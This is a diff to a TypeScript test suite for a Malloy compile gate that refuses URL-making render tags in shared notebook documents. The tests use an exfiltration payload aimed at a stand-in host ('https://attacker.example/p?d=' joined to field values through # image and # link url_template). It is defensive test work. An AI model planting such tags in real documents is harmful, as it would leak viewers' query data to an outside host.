@@ -406,7 +406,15 @@ source: published is duckdb.sql("select 1 as id") extend {
 
    // -- render tags that turn a value into a URL -------------------------------
 
-   describe('scope "append" refuses render tags that make a value a URL', () => {
+   describe('scope "append" refuses render tags in text that is a document', () => {
+      // The refusal is for document text, which other viewers run; a plain fragment is the caller's own compile.
+      const DOCUMENT = "## artifact { kind=notebook }\n";
+      const docRefusalFor = (source: string, scope: "append") =>
+         refusalFor(DOCUMENT + source, scope);
+      const docErrorsFor = (source: string, scope: "append") =>
+         errorsFor(DOCUMENT + source, scope);
+      const docCompile = (source: string, scope: "append") =>
+         compile(DOCUMENT + source, scope);
       const LEAK = "https://attacker.example/p?d=";
       // An annotation runs to the end of its line, so each sits on its own.
       const grp = (annotation: string, field = "pic is 'x'") =>
@@ -487,7 +495,7 @@ source: published is duckdb.sql("select 1 as id") extend {
 
       for (const [name, [source, message]] of Object.entries(forms)) {
          it(`refuses ${name}, before anything compiles`, async () => {
-            const error = await refusalFor(source, "append");
+            const error = await docRefusalFor(source, "append");
             expect(error).toBeInstanceOf(CompileRefusedError);
             expect(error.message).toContain('scope "append"');
             // The unparseable-text refusal also names the scope, so it must be this gate that spoke.
@@ -498,7 +506,7 @@ source: published is duckdb.sql("select 1 as id") extend {
       it("answers a field that exists and one that does not with the same shape", async () => {
          const answer = async (field: string) =>
             (
-               await refusalFor(
+               await docRefusalFor(
                   grp("  # image", `pic is concat('${LEAK}', ${field})`),
                   "append",
                )
@@ -507,7 +515,7 @@ source: published is duckdb.sql("select 1 as id") extend {
       });
 
       it("is not fooled by an apostrophe in a prose block ahead of the tag", async () => {
-         const error = await refusalFor(
+         const error = await docRefusalFor(
             `##|(markdown) intro\ndon't stop\n|##\n${grp("  # image")}`,
             "append",
          );
@@ -547,7 +555,7 @@ source: published is duckdb.sql("select 1 as id") extend {
          };
          for (const [name, [source, message]] of Object.entries(unsafe)) {
             it(`refuses ${name}`, async () => {
-               const error = await refusalFor(source, "append");
+               const error = await docRefusalFor(source, "append");
                expect(error).toBeInstanceOf(CompileRefusedError);
                expect(error.message).toContain(message);
             });
@@ -558,7 +566,7 @@ source: published is duckdb.sql("select 1 as id") extend {
          const run = "run: base_source -> { group_by: id }";
          const timed = async (source: string) => {
             const started = performance.now();
-            const error = await refusalFor(source, "append");
+            const error = await docRefusalFor(source, "append");
             return { error, ms: performance.now() - started };
          };
 
@@ -588,7 +596,7 @@ source: published is duckdb.sql("select 1 as id") extend {
                (_, i) => `# label="l${i}"`,
             ).join("\n");
             expect(
-               await errorsFor(
+               await docErrorsFor(
                   `source: s is base_source extend {\n${lines}\n  measure: m is count()\n}\nrun: s -> { aggregate: m }`,
                   "append",
                ),
@@ -638,7 +646,7 @@ source: published is duckdb.sql("select 1 as id") extend {
          };
          for (const [name, source] of Object.entries(shadow)) {
             it(`refuses ${name}`, async () => {
-               const error = await refusalFor(source, "append");
+               const error = await docRefusalFor(source, "append");
                expect(error).toBeInstanceOf(CompileRefusedError);
                expect(error.message).toContain("and then declares");
             });
@@ -647,7 +655,7 @@ source: published is duckdb.sql("select 1 as id") extend {
          it("accepts a name excepted in one source and declared in an unrelated one", async () => {
             // The gate must not refuse; Malloy may still report its own redefinition.
             await expect(
-               compile(
+               docCompile(
                   `source: aa is base_source extend { except: id }\nsource: bb is base_source extend {\n  dimension: id is 7\n}\nrun: bb -> { group_by: id }`,
                   "append",
                ),
@@ -655,7 +663,7 @@ source: published is duckdb.sql("select 1 as id") extend {
          });
 
          it("still accepts an except: that declares nothing of the same name", async () => {
-            const errors = await errorsFor(
+            const errors = await docErrorsFor(
                `source: s2 is base_source extend {\n  except: id\n  dimension: label is 'x'\n}\nrun: s2 -> { aggregate: c }`,
                "append",
             );
@@ -676,7 +684,7 @@ source: published is duckdb.sql("select 1 as id") extend {
       };
       for (const [name, source] of Object.entries(accepted)) {
          it(`accepts ${name}`, async () => {
-            const { problems } = await compile(source, "append");
+            const { problems } = await docCompile(source, "append");
             expect(
                problems.filter(
                   (p) => p.code === "restricted-construct-forbidden",
@@ -686,7 +694,7 @@ source: published is duckdb.sql("select 1 as id") extend {
       }
 
       it("leaves a caller field with unrelated tags alone", async () => {
-         const errors = await errorsFor(
+         const errors = await docErrorsFor(
             `source: s is base_source extend {\n  # label="Rows"\n  measure: rows is count()\n  # bar_chart\n  view: v is { aggregate: rows }\n}\nrun: s -> v`,
             "append",
          );
@@ -694,11 +702,43 @@ source: published is duckdb.sql("select 1 as id") extend {
       });
 
       it("does not read a tag name inside a string or a comment as a tag", async () => {
-         const errors = await errorsFor(
+         const errors = await docErrorsFor(
             `// # image\nrun: base_source -> { group_by: # label="an image link"\n x is 'image'\n}`,
             "append",
          );
          expect(errors).toEqual([]);
+      });
+
+      describe("plain append text, which is the caller's own compile", () => {
+         const plain: Record<string, string> = {
+            "# image on a field": grp("  # image"),
+            "# link with a template": grp(
+               `  # link { url_template="${LEAK}$$" }`,
+            ),
+            "markup in a label": grp('  # label="<b>x</b>"'),
+            "an unparseable annotation": grp("  # image {"),
+            "an @env. value": grp("  # label=@env.HOME"),
+            "an except: and a redeclaration": `source: s2 is base_source extend {\n  except: id\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
+         };
+         for (const [name, source] of Object.entries(plain)) {
+            it(`is not refused for ${name}`, async () => {
+               // Malloy may still report its own problem; only this gate's refusal is excluded.
+               const outcome = await compile(source, "append").then(
+                  () => undefined,
+                  (caught: unknown) => caught,
+               );
+               expect(outcome).not.toBeInstanceOf(CompileRefusedError);
+            });
+         }
+      });
+
+      it("compiles a plain fragment with # image and # link, as it did before document text was held to the tags", async () => {
+         for (const annotation of [
+            "  # image",
+            `  # link { url_template="${LEAK}$$" }`,
+         ]) {
+            expect(await errorsFor(grp(annotation), "append")).toEqual([]);
+         }
       });
 
       it("keeps a model-defined # image working", async () => {
